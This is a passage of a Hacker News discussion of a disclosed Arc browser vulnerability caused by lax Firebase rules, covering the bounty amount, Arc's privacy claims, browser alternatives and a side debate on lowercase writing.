forced for logging in, before they are able to use the browser. reply doix 11 hours agorootparentIf I had to guess, the typical Arc user is a Mac user in tech. It doesn't run on Linux, most windows users wouldn't run it, and non-tech people haven't heard of it. Then most engineering IC people will most likely run Firefox or Chrome, so you're probably looking at designers/founders/managers as your target. Probably some interesting targets there, but not the type that the NSA cares about. Just pure conjecture on my part of course ;). reply umanwizard 10 hours agorootparentThe only person I ever saw using Arc was a designer at a tech startup, so this checks out. reply cassianoleal 7 hours agorootparentI've seen quite a few. In one of my clients's Slack there are at least a couple people advocating for it all the time. They're mostly DLs or in similar roles. I also know at least one developer who uses it. I used it for a while for a very limited use case. Some interesting concepts. Mostly I found it annoying though. I also didn't like the sign-in thing but still wanted to experiment. I have dropped it altogether and kept Firefox as main browser (as it's been for many years) and Safari as a secondary. Both work much better overall for my needs. reply sulandor 11 hours agorootparentprevconfirmed i don't even like logging in WHILE using the browser and have never heard of arc reply shepherdjerred 14 hours agorootparentprevHaving arbitrary browser access would be pretty valuable, even for just a small number of users. reply Imustaskforhelp 10 hours agorootparentprevmy brother uses arc browser , he is a developer . I think he saw it from somebody using it (maybe theo t3 or some other creator he watches) , and he found it cool (plus there were lot of videos flooded with saying arc is really great IDK) If someone finds something cool on the internet. They are going to try it , given that they are capable to do so. He had a mac so he was able to do so , Even I tried to run arc on windows once when it was really beta and only available to mac (I think now it supports windows not sure) I just kindly want to state that if the nsa could've bought this exploit , they could've simply waited and maybe even promote arc themselves (seems unlikely) Maybe they could've tried to promote the numbers of arc users by trying to force google and microsoft search engine through some secret shady company advertising / writing blog posts for arc / giving arch funding or like how we know that there are secret courts in america ( and since these search engines basically constitutes for a high percentage of discovery of stuff by search engine by users) People could've credited the success to arc in that case for getting more users but the real winner would've been NSA. reply timeon 1 hour agorootparent> He had a mac so he was able to do so How? I have mac as well but when I've download it some time ago it required login. Has that changed? reply 255kb 9 hours agorootparentprevFirestore rules are in \"lock mode\" (no read or write allowed) by default since a long time. Then, everything is ultra well explained in the docs. I was already aware of it when being a noob dev 10 years ago, and could easily write a rule to enforce auth + ownership in the rules. No way, seasoned devs can miss that. reply Thorrez 12 hours agorootparentprevThe page says $2,000. reply Imustaskforhelp 10 hours agorootparentprevyes. I feel sad that now we have created an incentive where selling to the govt.'s is often much lucrative than telling to the vulnerable party (arc in this case) (just imagine , this author was great for telling the company , this is also a cross platform exploit with very serious issues (I think arc is available on ios as well)) how many of such huge vulnerabilities exist but we just don't know about it , because the author hasn't disclosed it to the public or vulnerable party but rather nsa or some govt. agency reply rmbyrro 5 hours agorootparentprevA couple? A vuln like this is worth >$1M very easily on the market. reply ForHackernews 7 hours agoparentprevWhat is Arc? reply homebrewer 7 hours agorootparenthttps://news.ycombinator.com/item?id=36862546 reply Imustaskforhelp 10 hours agoparentprevI agree & disagree. Browsers are very important part of our life. If someone compromises our browsers , they basically compromise every single aspect of privacy and can lead to insane scams. And because arc browser is new , they wanted to build fast and so they used tools like firebase / firestore to be capable of moving faster (they are a startup) Now I have read the article but I am still not sure how much of this can be contributed to firebase or arc On the following page from same author (I think) https://env.fail/posts/firewreck-1 , tldr states - Firebase allows for easy misconfiguration of security rules with zero warnings - This has resulted in hundreds of sites exposing a total of ~125 Million user records, including plaintext passwords & sensitive billing information So because firebase advocates itself to the developers as being safe yet not being safe , I think arc succumbed to it. firestore has a tendency to not abide by the system proxy settings in the Swift SDK for firebase, so going off my hunch, Also , you say that you have been convinced to never use arc again. Did you know that chrome gives an unfair advantage to its user sites by giving system information (core usage etc.) and some other things which are not supposed to be seen by browsers only to the websites starting with *.google.com ? this is just recently discovered , just imagine if something more serious is also just waiting in the shadows Couldn't this also be considered a major security vulnerability just waiting to be happen if some other exploit like this can be discovered / google.com is leaked and now your cpu information and way more other stuff which browsers shouldn't know is with a malicious threat actor ? reply nine_k 9 hours agorootparentI very much agree with the idea that browsers are security-sensitive software, unlike, say, a picture editor, and more like an ssh server. It should be assumed to be constantly under attack. And browser development is exactly not the area where I would like to see the \"move fast, break things\" attitude. While firebase may be sloppy with security and thus unfit for certain purposes, I would expect competent developers of a browser to do due diligence before considering to use it, or whatever else, for anything even remotely related to security. Or, if they want to experiment, I'd rather that be opt-in, and come with a big banner: \"This is experimental software. DO NOT attempt to access your bank account, or your real email account, or your social media accounts\". With that, I don't see much exploit potential in learning stats like the number of cores on your machine. Maybe slightly more chances of fingerprinting, but nothing comparable to the leak through improper usage of firebase. reply prmoustache 9 hours agorootparentprevYou do know that there are more than chrome and arc right? reply IggleSniggle 6 hours agorootparentprev> Did you know that chrome gives an unfair advantage to its user sites by giving system information (core usage etc.) and some other things which are not supposed to be seen by browsers only to the websites starting with *.google.com ? That's pretty interesting. Where can I learn more about this? reply chucksmash 3 hours agorootparentI recall there being a thread with way more discussion at the time, but I can't put my finger on that thread right now. This post has some information: https://news.ycombinator.com/item?id=35152419 reply jaharios 5 hours agorootparentprev>>Did you know that chrome gives an unfair advantage to its user sites by giving system information (core usage etc.) and some other things which are not supposed to be seen by browsers only to the websites starting with *.google.com ? Yeah so using chrome based browsers like Arc is giving more power to Google to do shady stuff while also being a victim of the third party unsafe code. reply ahoef 13 hours agoprevNice article, but this is hard to read without proper capitalization. My brain uses capitals to scan beginning and ending of text. reply Aachen 9 hours agoparentI was similarly fascinated by the stylistic choices made here. No capitalisation of even any names, no hyphen in a compound adjective, but dots and commas and spaces are deemed necessary, also before \"and\" where the word clearly acts as separator already. If you look at the waveform of speech, we have no spaces between regular words so, if they want to eliminate unnecessary flourishes... though perhaps (since text largely lacks intonation markers) that makes it too unreadable compared to the other changes. All this is somehow at least as fascinating to me as the vulnerability being described! reply latexr 8 hours agorootparentIt’s just another dumb social media trend, like tYpiNg LiKe tHiS. Hopefully it too will phase out. Search for “lowercase trend” and you’ll find reports of it going years back, there’s nothing worth being fascinated about. It has seeped into HN as well. Look closely and you’ll notice several commenters type like that. reply segasaturn 6 minutes agorootparentSocial media? I remember people doing the lowercase thing back on IRC. It was an indicator of informality and \"coolness\". reply squigz 7 hours agorootparentprevStrange to label a failure to capitalize words as a \"dumb social media trend\", as I'm sure people have been doing that for many years prior to social media. And nobody tYpEs lIkE tHiS except when making a joke. reply latexr 6 hours agorootparent> Strange to label a failure to capitalize words It’s not a failure, it’s a conscious choice. > as I'm sure people have been doing that for many years prior to social media. But now it’s happening more frequently. That’s what “trend” means. It doesn’t mean it never happened before. > And nobody tYpEs lIkE tHiS except when making a joke. Just because you don’t know people like that, does not mean they don’t exist. The world is bigger than one person’s knowledge. I personally knew several teenagers who did it for all their communication, before smartphones. The speed at which they were able to do it was astounding. reply PKop 1 hour agorootparentprevNo it isn't. It is dumb, and very annoying. Why wouldn't a trend that makes things harder to read be called dumb so that people stop doing it? It is most certainly a social media trend. reply Wingy 7 hours agorootparentprevI use it to indicate tone. Proper capitalization and punctuation reads with a formal, cold tone. lowercase without caps reads with a warmer, informal tone there’s a Tom Scott Language Files video documenting it: https://www.youtube.com/watch?v=fS4X1JfX6_Q reply bigstrat2003 2 hours agorootparent> lowercase without caps reads with a warmer, informal tone No, it reads as \"I'm uneducated and don't know how to write the English language properly\". It's incredibly obnoxious for people to use as an affectation. reply scblock 48 minutes agorootparentRelax, buddy. reply bluehatbrit 5 hours agorootparentprevThat's really interesting, I personally don't read those tone differences based on the casing. Neither approach carries different warmth or formality to me at all. I wonder if this is a regional or generational thing? reply latexr 5 hours agorootparent> I wonder if this is a regional or generational thing? Generational is a good bet: https://news.ycombinator.com/item?id=41537994 reply PKop 1 hour agorootparentprevNo, it's a left-liberal political thing. They do it to be different or maybe even more likely to annoy people that find it irritating when people don't write in a way that isn't distracting and drawing your attention to it instead of the content of what they're writing. reply latexr 5 hours agorootparentprev> lowercase without caps reads with a warmer, informal tone Personally, and I’m certain I’m not alone on this, it reads as annoying. It’s harder to follow and looks as if the writer didn’t care to do the bare minimum to make the text accessible and clear to the reader. > there’s a Tom Scott Language Files video documenting it Per that video (thank you for sharing), capital letters “make a paragraph easier to read” and “context matters” and “the conventions change fairly quickly” and typing in all lowercase is “sometimes okay”. This is a post documenting a serious browser vulnerability, shared to the wide internet, not an informal conversation between buddies. Clarity matters. I don’t fully buy the tone argument and find words and sentence structure are more important. Take the following two examples: > Just heard about your promotion, you beautiful bastard! Let’s go get pissed to celebrate, on me! And: > good afternoon mrs bartlet. the limousine will be available in twenty minutes. i would also like to apologise for my behaviour yesterday when i inadvertently insulted your husband it was a faux pas i promise will not be repeated. my resignation will be on your desk by noon. I get that language evolves. You do you. Personally I hope this trend subsides like so many others before it. Maybe you don’t like to read properly structured text and prefer all lowercase. My preference is the reverse. And that’s OK, we don’t all have to be the same. I merely wish that people who prefer a certain style understand not everyone will see it the same way they do (and I’m including myself). reply PKop 1 hour agorootparentprevIt's extremely irritating, distracting, and breaks focus on the content instead of the annoying stylistic choice, just an fyi..but I imagine you probably like that this is true and purposely try to annoy the people that aren't in the little club. If not, then I suggest not doing it. The tone I perceive from it is \"F**** the reader\" reply michaelt 11 hours agoparentprevIf you were using Arc you could add a Boost for \"Case: toggle between different capitalization settings - they will apply to all text on the webpage\" [1] /s [1] https://resources.arc.net/hc/en-us/articles/19212718608151-B... reply 63stack 7 hours agorootparentDepending on the version you are using, you might not even need to add it, someone else might just add it for you! reply ramonverse 10 hours agorootparentprevthis made me laugh. 10/10 reply shepherdjerred 14 hours agoprev$2000 is an insulting amount for such a huge vuln reply bruh2 4 hours agoparentJudging by blog posts on HN, I got the impression that these vulnerabilities are often not rewarded at all, or rewarded by a minuscule amount. It almost seems like companies are begging hackers to sell these exploits. Perhaps because they aren't penalized by the regulator for breaches? reply dgellow 8 hours agoparentprevYeah, that was my first reaction. I'm really surprised they were cheap on this reply isoprophlex 12 hours agoparentprevYeah, you have to have some solid backbone not to sell this off to some malicious party for 20-50x that amount... reply umanwizard 10 hours agorootparentAm I too optimistic? I feel like most regular people I know wouldn’t sell this off. Most people are not antisocial criminals by nature, and also wouldn’t know how to contact a “state actor” even if they wanted to. reply diggan 2 hours agorootparent> Am I too optimistic? I feel like most regular people I know wouldn’t sell this off. Probably you're just used to a relatively good life, not a bad thing :) Image being able to sell this off for $20,000 (although I think you could ask for more, seems to be a really bad vulnerability) in a marketplace, for >90% of the world that's a pretty good amount of money that you could survive a long time on or add a lot of additional quality to your life. reply pityJuke 10 hours agorootparentprev> also wouldn’t know how to contact a “state actor” even if they wanted to. That's why brokerages like Zerodium exist - you can sell it to them, and they'll sell it onto state actors. reply timeon 1 hour agorootparentprevOpportunity makes a thief. Most people does not have the opportunity even if they have skill. reply saagarjha 11 hours agorootparentprevA malicious party who wants a vulnerability in a browser effectively nobody uses? reply exabrial 5 hours agoprevI roasted them on HN when they announced their product: Browsing the interest should not require an account. Its an \"HTML Client\", absolutely absurd. Hopefully they sit down and reconsider their choices. reply gsanderson 23 minutes agoprevYikes. I tried Arc a while ago but switched back to Chrome. Quite glad I did now. reply imglorp 16 hours agoprevOP is talking about the Arc browser, not the Arc language, the Arc \"Atomic React\" project, or any of scores of other projects with that name. reply throwaway984393 14 hours agoparenthttps://arc.net/faq I'm definitely not the target audience... Even after reading the faq I have no idea what it does reply __jonas 9 hours agorootparentIt's a browser (chromium based) with a really nice UI that people love, I am intrigued but haven't used it because I find the requirement to create an account off-putting. reply efilife 9 hours agorootparentprevI don't understand what you do not get. In the link you sent they claim to be a privacy oriented web browser based on chromium reply lemonberry 5 hours agoprevArc was recommended to me by a friend. I deleted upon finding out I needed an account to use it. The excuse Arc gives is in case you want to sync. I'm capable of opting into that. reply timeon 1 hour agoparent\"in case\" is good excuse if the account is optional. Which is not case here. reply bmelton 6 hours agoprev> i discovered that there was a arc featured called easels, easels > are a whiteboard like interface, and you can share them with people, > and they can view them on the web. when i clicked the share button > however, there was no requests in my mitmproxy instance, so whats > happening here? I first noticed this on a flight to Paris. I was building a Flutter app using Firestore, and tho I had not paid for the onboard wifi (I was doing local development) I was connected and all of my Firestore calls were succeeding. I thought this was novel, and assumed it was just something to do with websockets, so I switched to another, non-firebase-but-yes-websockets project and noticed it didn't work. At the time, I debated moving calls to Firebase just so that I could work for free while I was on flights, but realized the ROI wasn't remotely there. Glad to finally have someone else acknowledge it happening, and give some insight as to why. reply rockostrich 1 hour agoprevIt would be nice if I could download a version of the Arc browser with the cloud bits removed. I use it because of the UI/UX and pretty much ignore everything else. Really if there was a browser that let me keep organized spaces in a left panel plus create split screen views then it would immediately convince me to switch from Arc. reply supriyo-biswas 15 hours agoprevGreat research. As I've said elsewhere, Firebase's authentication model is inherently broken and causes loads of issues, and people would be better off writing a small microservice or serverless function that fronts Firebase. Also, for anyone trying to read the article, they should put `/oneko.js` in their adblocker. reply Aaron2222 14 hours agoparent> Also, for anyone trying to read the article, they should put `/oneko.js` in their adblocker. Only if you hate cats, pixel art, or are easily distracted. reply Milner08 8 hours agorootparentIm dyslexic and I tend to use the pointer to follow what I am reading to help me. The cat was annoying as hell. I just had to hide the element in the DOM before i could read more than a few lines. Infuriating design choice to make it follow the pointer. reply hunter2_ 13 hours agorootparentprevI suspect it's that they hate are easily distracted (if \"hate\" falls outside of the series, such that it applies beyond just \"cats\")! reply nottorp 12 hours agorootparentprevLooks like someone already added it to uBlock Origin since I see no cat. Or maybe the cat doesn't support Firefox... reply doix 11 hours agorootparentDid you enable the ui.prefersReducedMotion setting? That hides the cat from what I can tell reply nottorp 11 hours agorootparentHmm not that I remember. But I have reduced motion enabled on my phone system wide and maybe that synced to my desktop on its own. Which is scary come to think of it. reply nottorp 9 hours agorootparentToo late to edit... i just got around to checking and I do have system wide reduced motion and reduced transparency on this laptop. I'm sure I didn't set it up on there, just on the phone. I think Apple is starting to sync too much... reply latexr 8 hours agorootparentThat seems like a perfectly reasonable thing to sync. Accessibility settings are exactly the type of thing you shouldn’t have to configure again and again on every device. Either way, you can disable syncing of system settings. reply nottorp 7 hours agorootparent> That seems like a perfectly reasonable thing to sync. Accessibility settings are exactly the type of thing you shouldn’t have to configure again and again on every device. No, because I disabled motion on my phone because the wiggling of icons on the main screen annoyed me, not because I have motion sickness. Nothing wiggles on the desktop (yet). This option doesn't even belong in accessibility IMO, it should be a \"stop annoying me\" section. > Either way, you can disable syncing of system settings. Where? The same spot where I can disable syncing the clipboard? I.e. somewhere deep in an undocumented file? reply latexr 6 hours agorootparentGotta be honest, the aggressive and unreasonable snark completely turns me off from helping you. It feels that regardless of the obviousness of the setting, you’ll find some nitpick to shout back at me about it. Since I don’t work for Apple or yourself, I don’t have to justify their choices or be the recipient of your unjustified and unprompted bad humour. I’m making a conscious choice to not soil my Friday on account of some internet rando. You’re on your own for this one. I genuinely wish you a calm weekend and peaceful start of the week. reply nottorp 6 hours agorootparentThanks for the martyrdom but last time I checked clipboard syncing it was a package with everything that gets synced, including sms forwarding etc on Apple. If there is a way to disable syncing granularly it’s not documented anywhere. reply dgellow 8 hours agorootparentprevAh thanks, that explains why I don't see the cat everybody mentions reply eru 10 hours agorootparentprevI use uBlock Origin and Firefox (on Mac) and see the cat. reply zachrip 8 hours agoparentprevIt's really not hard to build this safely in firebase, this could've been authored the same way in node too. I think whoever authored this either majorly cut corners or just isn't experienced enough to understand how to write authenticated controllers like this. This should scare people away from this browser, it's such a basic thing to mess up and it shouldn't have happened. reply Sakos 6 hours agoparentprev> Firebase's authentication model is inherently broken I'm not very familiar with Firebase. In what way is it broken and what issues does it cause? reply supriyo-biswas 1 hour agorootparentThe fact that clients write directly into the database and that it's widely encouraged. There are security rules in Firebase to prevent this, but bolt-on security models that the user has to explicitly enable haven't shown to work. reply bestest 12 hours agoprevthe developers working with firebase should enforce common-sense document crud restrictions in the rules. that's just how firebase is. everyone knows it. now, when talking about ARC BROWSER, i am seriously starting to doubt the competence of the team. I mean, if the rules are broken (no tests? no rules whatsoever?), what else is broken with ARC? are we to await a data leak from ARC? any browser recommendations with proper vertical tabs and basically everything working like it does in ARC? reply fold3 12 hours agoparentDid you took a look at the zen browser? It's an arc clone based on Firefox https://zen-browser.app/ reply tomaskafka 4 hours agorootparentI did. It’s like 20 % an Arc clone, and 80 % of UX papercuts. Like, you can’t have ‘add tab’ button on top when the new tab gets added to the bottom. Or that one sidebar button opens a side window to the right of the sidebar, while another below it opens the favorites to the left and moves the whole sidebar from underneath your mouse. Looks like a minimal effort css restyle of Firefox. reply currymj 2 hours agorootparentprevi'm rooting for them to succeed, but if the concern is security, switching your daily driver browser to a brand-new browser that's still in alpha is unfortunately not a good idea. reply bestest 8 hours agorootparentprevnice. will probably try it in the future. but the for-some-reason-not-obvious revelation that it's just a product that some team somewhere is working on and the fact that a browser is an important piece of software brought me back to safari (not sure if joke's on me, but in this case I trust apple engineers to do a more thorough job in ensuring my data is secure). reply Wingy 7 hours agoparentprevZen and MS Edge have proper vertical tabs. reply adhamsalama 7 hours agoparentprevTry Firefox with Sideberry extension. reply soundnote 7 hours agoparentprevBrave. Vertical tabs, privacy, everything sync is e2ee (unlike eg. Edge). Vivaldi may also be worth a look. Similar setup: User-oriented team, vertical tabs, e2ee sync. If you like a thorough browser history, I think Vivaldi keeps a more detailed browsing history than most other Chromium browsers. reply tomaskafka 4 hours agorootparentBrave is VC funded and needing to extract a billion of value. Just like Arc. reply tomaskafka 6 hours agoprevFor some time I asked why doesn't Arc let me sync my passwords. After seeing this level of incompetence, I am happy they didn't attempt that. Yet. reply oefrha 4 hours agoprev> firestore has a tendency to not abide by the system proxy settings in the Swift SDK for firebase, so going off my hunch, i wrote a frida script to dump the relevant calls. As someone who has done some reverse engineering of macOS apps but haven't used anything beyond Charles' macOS proxy feature, this looks very painful. Is there a proxy app that maybe acts as a VPN so that basically every HTTP request is guaranteed to go through it, so that you don't need to write a hundred lines of bespoke Frida just to capture requests? Edit: On second thought Proxifier should work for this purpose. reply ibash 50 minutes agoparentmitmproxy.org can act as a wireguard vpn iirc reply shermantanktop 4 hours agoprevUser identity must be derived from security context, typically at the edge of the system. But it’s so much easier for developers to think of userid as just another parameter, and they forget, and oops now they trust a random user-supplied parameter. reply pknerd 7 hours agoprevMan I miss these kinds of detective posts on HN reply causal 6 hours agoparentUpvote them, definitely something that makes HN special. reply kfarr 3 hours agoprevInstead of knee jerk firebase is bad, can we discuss how this could be abated properly with firebase rules for firestore? Is this the rule that was missing for arcs boosts or whatever object? ``` match /objects/{object} { // Allow create new object if user is authenticated allow create: if request.auth != null; // Allow update or delete document if user is owner of document allow update, delete: if request.auth.uid == resource.data.ownerUID } ``` reply omertoast 16 minutes agoprev$2000 is an insult, good luck getting tips for your future vulns. reply __jonas 9 hours agoprevThe vulnerability has been patched, but I suppose the browser still makes a firebase query for every website you visit? That's pretty bad, whether or not they track these requests, just seems wasteful. reply treyd 2 hours agoprevHow is this \"Arc boost\" system not just a more limited ad-hoc version of what WebExtensions already provide? reply userbinator 15 hours agoprevwhile researching, i saw some data being sent over to the server, like this query everytime you visit a site I'm not surprised in the least --- basically the vast majority of software these days is spyware. Looking at Arc's privacy page, it appears to be mainly marketing fluff similar to what I've seen from other companies. I have yet to find a privacy policy that says frankly \"we only know your IP and time you downloaded the software, for the few weeks before the server logs are overwritten.\" reply hypeatei 6 hours agoparentSeeing \"privacy focused\" in any sort of mission statement is almost becoming an indicator of the opposite (I'm sure there's a word for this) I'd rather a company have simple goals that can be explained in a sentence or two. No hand wavey BS like \"we care about your privacy\" reply latexr 8 hours agoparentprev> I have yet to find a privacy policy that says frankly \"we only know your IP and time you downloaded the software, for the few weeks before the server logs are overwritten.\" Not with those exact words, but that’s Alfred. Server connections are done only to validate the license and check for updates, and you can even disable that. https://www.alfredapp.com/terms/ > Alfred only contacts our server when activating your Powerpack license in order to validate it, as well as periodically checking for new software updates. You can disable the software update check in the Update preferences, but we recommend keeping this enabled to ensure that you always have the latest version for security reasons and to make the most of the awesome new features! reply nickisnoble 13 hours agoparentprevYeah, and no mention of if they addressed this. reply orliesaurus 13 hours agoprevI wish we didn't have to sign up to use a browser in the future reply soundnote 0 minutes agoparentWith Brave you don't need to, even for sync. reply sulandor 11 hours agoparentprevjust don't use browsers that do reply eru 10 hours agoprevFor context: what is this 'arc' that the blog post mentions? I presumes it's not Paul Graham's Lisp dialect in this context? EDIT: seems to be a browser or so? reply flinth_ 10 hours agoparentYes it's a new browser who tries to change the UX from traditional browsers: https://arc.net/ reply tech_ken 2 hours agoprevOop and I just convinced my wife and brother to move over :o Props to her, she asked about the security and privacy of the browser and I played it off with some fanboy propaganda. Lesson learned on that one. If I only care about the vertical tabs, workspaces, and a (decent) mobile app are there any good equivalents right now? reply diggan 2 hours agoparent> If I only care about the vertical tabs, workspaces, and a (decent) mobile app are there any good equivalents right now? I use Firefox mostly because of Sideberry (which does vertical tree-style tabs) which also integrates with \"containers\", so you can have something similar to workspaces but more isolation. Otherwise there is also \"profiles\" that probably offer even more isolation between the different profiles. reply jonjojojon 1 hour agoparentprevFirefox with extensions? The current vertical tabs extensions are not nearly as nice, but Mozilla is working on native vertical tabs. Syncing and Workspaces are already better with Firefox then with Arc. reply ainiriand 11 hours agoprevStart -> Control Panel -> Programs and Features -> Search 'Arc' -> Uninstall. reply erdinc 4 hours agoparent...said Windows user. reply upghost 17 hours agoprevArticle great, cute doge even better. Here's my upvote! reply ars 17 hours agoparentThe dog is actually a cat named Neko. https://en.wikipedia.org/wiki/Neko_(software) reply DoreenMichele 16 hours agorootparentTo be clear, it's a cat named \"cat\" in Japanese. reply upghost 14 hours agoparentprevI got downvoted for calling it a dog?? Now that's ruff!! reply robbiewxyz 10 hours agorootparentGood pun :) HN tends to be a little hard on brief comments. My current understanding is that comments with little substance are totally acceptable provided they're good natured. For example this comment by dang \"There's nothing wrong with submitting a comment saying just \"Thanks.\"\" https://news.ycombinator.com/item?id=37251836. Also from the guidelines \"Comments should get more thoughtful and substantive, not less, as a topic gets more divisive\": this post's topic doesn't likely qualify as divisive. reply efilife 9 hours agorootparentprevWait until you see that this got downvoted too. HN is a toxic place reply maipen 10 hours agoprevVery small bounty, but I honestly believe this arc thing won’t last long… Browsers are hard and my only choice has been chrome and will remain so for the long foreseeable future. When I was younger I would enjoy switching to firefox, opera, etc.. But I always came back to chrome because it just worked and always performed when I needed. Chrome/chromium is the safest browser. People tend to fall for the shiny new thing and then realize it was just hype. Please be very careful about what software you choose to perform most of your activities. The same applies to these “new ai IDEs” that keep popping up every other say. reply appendix-rock 10 hours agoparent…Firefox as an alternative to Chrome!? Am I really that old!? I used Chrome for years and years, right from when it first came out. Since then, I switched back to Firefox, and have used it for years. It works perfectly fine. reply tomaskafka 4 hours agoparentprevBrowser is an user agent. Chrome is an advertisement company agent running on your PC, collecting data for that advertising company. People often confuse these two, but they’re the polar opposites. reply lcnPylGDnU4H9OF 6 hours agoparentprev> Chrome/chromium is the safest browser. Why do you say that? reply phyllistine 5 hours agoprevYeah with this and the privacy zinger at the end its definitely time my monthlong experiment with arc comes to a close. Too bad that the thing theyre actually proud of, the tabbing UX, was actually really good. reply seanvelasco 3 hours agopreveva (kibty.town) and mr. bruh never disappoint! reply jongjong 12 hours agoprevThis is a nice investigation and a great read. Sad that they don't normally do bug bounties. $2000 seems small considering the severity of this vulnerability. Though I guess the size and finances of the company is a factor. It takes some serious skills, effort and luck to discover something like that. It should be well compensated. reply trallnag 7 hours agoprevHow could one sell a vulnerability like this to let's say Mossad? Write them an email? reply diggan 2 hours agoparenthttps://www.mossad.gov.il/contact-us/en Interestingly enough, contains a field for entering your Father's name (but not your mother's). reply who-shot-jr 5 hours agoparentprevPage them :) reply fredgrott 4 hours agoprevhmm gee I wonder was it worth to value the bug bounty at $2500 given the severity of both the bug and sheer lack skills of the browser company staff...it might even be a reputation destroyed event... reply tnorthcutt 4 hours agoprevhttps://www.crunchbase.com/organization/the-browser-company/... > Total Funding Amount $68M the browser company normally does not do bug bounties, but for this catastrophic of a vuln, they decided to award me with $2,000 USD I'm struggling to put into words how disappointing I find this. reply gspencley 3 hours agoparentI've got a different take. If they're in the VC phase, that means they are not self sufficient. The amount of funding that they've raised is no indication what-so-ever of a) how much of that funding has actually been realized / received b) what their overhead is and c) what their overall financial picture looks like. I do wish that more companies would take privacy and security seriously. And bug bounty programs are great. But they're not always within the budget of companies and the fact that they decided to award this security researcher regardless of having no such program is a massive win in my opinion and shows how much they value this particular contribution. reply tnorthcutt 2 hours agorootparentThanks for the reply! I think I disagree with you, mostly because it seems like this particular bug could have been company-destroying because of the potential reputation hit if it was exploited on a wide scale. But regardless, I appreciate your perspective and it gives me some stuff to consider I hadn't previously. reply cmsj 1 hour agorootparentprevI think we all know that tech debt often lives forever, so if you're going to start a browser company, you simply must be thinking about security/privacy from day one. If the VC model doesn't make that possible, then the only reasonable conclusion is that browsers shouldn't be a thing that VC funded startups work on. reply gspencley 1 hour agorootparentI appreciate your response, and largely agree with you. But you can take security seriously without having a program in place to pay non employees for work they did without you asking them to. Also, while I love companies that have bug bounty programs... I don't think any company without such a program is under any obligation to pay someone just because they volunteered their time without the company knowing about it or soliciting the work in any way. So the fact that they did in this case, despite having no program, is what I'm choosing to focus on. I want to share a personal anecdote to put my opinion into more perspective. I owned a small business operating a for-profit website for 18 years, for 15 of those years it was my primary source of income. I had no employees other than myself. It was just me on my own working from home. I earned enough to pay the bills, but I'm currently earning 2x what my business earned at its peak traffic by being an employee. So it's not like I had money to be paying people... it was pretty much an average software engineer's salary in terms of what I brought in. Anyway, over those 18 years I had a few dealings with some white-hats who were very nice and clued me in to some issues. I thanked them and when they politely asked if \"we\" (because they didn't know any better) had a program it was a non-issue when I explained that I'm too broke as a one-person shop trying to feed a family to be paying out anything substantial but I could PayPal a cup of coffee or something for their trouble. But then I had a few dealings with complete shady assholes who tried to extort money out of me by threatening to exploit what they had found and go public and basically drag my reputation through the mud. Experiences with the latter group make me sympathize a lot more with companies that decide to have a policy of just blanket not dealing with outside security researchers, to take the information and then deal with the fixes internally and quietly. reply nicolasmontone 4 hours agoparentprevThis is 100% company culture, probably the ones that decide this kind of things are not technical or don't understand how important is this. reply ggregoire 2 hours agorootparentThey disclosed the vulnerability directly to the co-founder CTO. > the timeline for the vulnerability: > aug 25 5:48pm: got initial contact over signal (encrypted) with arc co-founder hursh > aug 25 6:02pm: vulnerability poc executed on hursh's arc account reply ilrwbwrkhv 2 hours agoparentprevnext [2 more] [flagged] currymj 2 hours agorootparentArc is a great product, it's the nicest web browser to use, you can tell these people are really good at their jobs in many respects (though apparently not security?!?). probably a lot of investors saw that too and are willing to fund a very strong team with the hope of eventual product-market fit. reply instagraham 9 hours agoprev>privacy concerns >while researching, i saw some data being sent over to the server, like this query everytime you visit a site: > firebase .collection(\"boosts\") .where(\"creatorID\", \"==\", \"UvMIUnuxJ2h0E47fmZPpHLisHn12\") .where(\"hostPattern\", \"==\", \"www.google.com\"); > the hostPattern being the site you visit, this is against arc's privacy policy which clearly states arc does not know which sites you visit. reply soared 6 hours agoparentWhat sort of data does Arc track? Our plain-english Privacy Policy summarizes it well: We don’t know which websites you visit reply nfm 6 hours agorootparentFrom the quoted snippet, every page load is leaking both the domain and authed user’s ID to Firebase. reply Cthulhu_ 4 hours agorootparentYeah but if they super promise to not look at incoming Firebase queries they're not tracking you, right? reply bschmidt1 4 hours agorootparentThe super promise died with crypto, now you have to add no backsies. My site uses No Backsies Proofs (NBPs) which are encrypted to prove that all my super promises are backed by a no backsie which is stored in the no backsie vault in Antarctica. reply fouc 3 hours agorootparentLater on moxie ends up writing a quick review of NBPs > Instead of storing the data on-chain, NBPs instead contain a URL that points to the data. What surprised me about the standards was that there’s no hash commitment for the data located at the URL. Looking at many of the NBPs on popular marketplaces being sold for tens, hundreds, or millions of dollars, that URL often just points to some VPS running Apache somewhere. Anyone with access to that machine, anyone who buys that domain name in the future, or anyone who compromises that machine can change the image, title, description, etc for the NBP to whatever they’d like at any time (regardless of whether or not they “own” the token). There’s nothing in the NBP spec that tells you what the image “should” be, or even allows you to confirm whether something is the “correct” image. reply ruined 2 hours agorootparentthis is why my startup is launching backsies rollups for the blob, with null-effect prebacksies. this way everyone can be assured that any backsies issued are technically equivalent to just not making the original agreement! if you can discover a post-agreement backsie within the availability period of 0 days, and we can confirm it, we'll pay you $2,000 no backsies. so we have a market incentive not to lie to you. it's very efficient reply fouc 1 hour agorootparentindeed, the market efficiency of a house of cards built on sand and thin ice cannot be overstated reply LegitShady 3 hours agorootparentprevI would feel more comfortable if your super promises were all on a blockchain, and we made No Backsie NFTs so people could clearly see these were legitimate and bid on them. reply wredue 2 hours agoparentprevMaybe I am just stupid, but this *super* smells of arc being able to inject whatever they want in to literally any of your websites and this dude just figured out that he could also do that. This does not seem like a browser capability I want. reply timeon 1 hour agorootparentseems like it is the case: https://news.ycombinator.com/item?id=41601332 reply mcpar-land 4 hours agoprevEvery single thing I've heard about Arc browser has been a massive red flag. Turns out it was even worse than I thought! reply cmsj 2 hours agoprevI read this from another source and I was a substantial way into it before it became obvious what Arc is. Blog authors: stop assuming I know about the existence of every piece of software. (also maybe occasionally consider using the Shift key on your keyboard so you can capitalise things :) reply whatevermom 11 hours agoprevI’m ashamed I fell for Arc and even recommended it to my friends, as someone whose job is exactly this but with Android apps :( reply efilife 9 hours agoparentThey claim so much and their browsers' code is 100% proprietary so it's impossiblen to verify their lies. This is what triggered the bullshit detector in my head reply latexr 8 hours agorootparent> They claim so much and their browsers' code is 100% proprietary Far from me to defend Arc (I dislike it for several reasons) but it’s based on Chromium so it’s far from 100% proprietary. Don’t Edge, Vivaldi, and even Chrome have proprietary layers on top of the open-source Chromium? reply Insanity 58 minutes agoprev [–] Damn, that is bad. While I enjoyed reading through the write-up, I think a \"summary section\" at the top would have benefited me lol. Someone recently recommended Arc to me, I installed it on my macbook and then never actually used it when I realized there's no Linux version available, and I like a consistent browser experience across all my devices. 